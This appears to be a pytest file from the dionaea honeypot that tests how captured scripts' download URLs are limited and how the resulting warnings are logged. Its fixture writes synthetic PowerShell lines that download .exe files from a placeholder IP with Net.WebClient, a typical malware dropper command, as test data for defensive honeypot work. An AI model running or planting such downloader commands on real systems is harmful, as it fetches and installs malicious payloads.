# This file is part of the dionaea honeypot
#
# SPDX-FileCopyrightText: none
#
# SPDX-License-Identifier: CC0-1.0

"""emu_scripts/__init__.py: a script with more urls than max_subdownloads offers that many,
the rest is not followed. The line of each script is info; one warning a minute sums them up
for all connections (LogSummary of logtext.py).

The handler is loaded with stand-ins of dionaea.core (it needs the binding); handler.py and
logtext.py are the real modules.
"""

import contextlib
import importlib.util
import logging
import os
import sys
import types
from pathlib import Path

import pytest


class FakeIncident:
    reported = []

    def __init__(self, origin):
        self.origin = origin

    def report(self):
        FakeIncident.reported.append(self)


class FakeIhandler:
    def __init__(self, path):
        pass


def _src_root():
    return Path(os.environ["DIONAEA_PY_SRC"]) if os.environ.get("DIONAEA_PY_SRC") else (
        Path(__file__).resolve().parents[3] / "modules" / "python" / "dionaea")


@contextlib.contextmanager
def _stand_ins():
    names = [name for name in sys.modules if name == "dionaea" or name.startswith("dionaea.")]
    saved = {name: sys.modules.pop(name) for name in names}
    package = types.ModuleType("dionaea")
    package.__path__ = [str(_src_root())]
    package.IHandlerLoader = type("IHandlerLoader", (), {})
    core = types.ModuleType("dionaea.core")
    core.ihandler = FakeIhandler
    core.incident = FakeIncident
    exception = types.ModuleType("dionaea.exception")
    exception.LoaderError = type("LoaderError", (Exception,), {})
    sys.modules.update({"dionaea": package, "dionaea.core": core, "dionaea.exception": exception})
    try:
        spec = importlib.util.spec_from_file_location(
            "dionaea.emu_scripts", _src_root() / "emu_scripts" / "__init__.py",
            submodule_search_locations=[str(_src_root() / "emu_scripts")])
        module = importlib.util.module_from_spec(spec)
        sys.modules["dionaea.emu_scripts"] = module
        spec.loader.exec_module(module)
        yield module
    finally:
        for name in [n for n in sys.modules if n == "dionaea" or n.startswith("dionaea.")]:
            sys.modules.pop(name, None)
        sys.modules.update(saved)


@pytest.fixture
def emu_scripts():
    """The module, with its stand-ins for the test (the handler imports .handler when it is made)."""
    with _stand_ins() as module:
        yield module


def script(tmp_path, urls):
    path = tmp_path / "script.ps1"
    path.write_bytes(b"".join(b'(New-Object Net.WebClient).DownloadFile("http://203.0.113.5/%d.exe", "x")\r\n' % n
                              for n in range(urls)))
    return str(path)


def test_the_urls_above_the_limit_are_info_and_one_warning_a_minute(emu_scripts, tmp_path, caplog, summaries):
    clock = summaries(emu_scripts.SUBDOWNLOADS)
    handler = emu_scripts.EmulateScriptsHandler("*", config={"enabled_handlers": ["raw_url"],
                                                             "max_subdownloads": 3})
    FakeIncident.reported.clear()
    with caplog.at_level(logging.INFO, logger="emu_scripts"):
        for n in range(4):
            icd = types.SimpleNamespace(con="con%d" % n, url="tftp://198.51.100.4/s%d.ps1" % n,
                                        path=script(tmp_path, 10))
            handler.handle_incident_dionaea_download_complete(icd)
            clock.advance(1)
        offers = [i for i in FakeIncident.reported if i.origin == "dionaea.download.offer"]
        assert 0 < len(offers) <= 4 * 4
        infos = [r.getMessage() for r in caplog.records
                 if r.levelno == logging.INFO and "subdownloads" in r.getMessage()]
        assert infos == ["Max number of subdownloads reached"] * 4
        warnings = [r.getMessage() for r in caplog.records if r.levelno >= logging.WARNING]
        assert warnings == [("subdownloads not followed at max_subdownloads: 1 script(s) in the last minute, "
                            "the last: tftp://198.51.100.4/s0.ps1 (3)")]
        clock.advance(60)
    warnings = [r.getMessage() for r in caplog.records if r.levelno >= logging.WARNING]
    assert warnings[1:] == [("subdownloads not followed at max_subdownloads: 3 script(s) in the last minute, "
                            "the last: tftp://198.51.100.4/s3.ps1 (3)")]
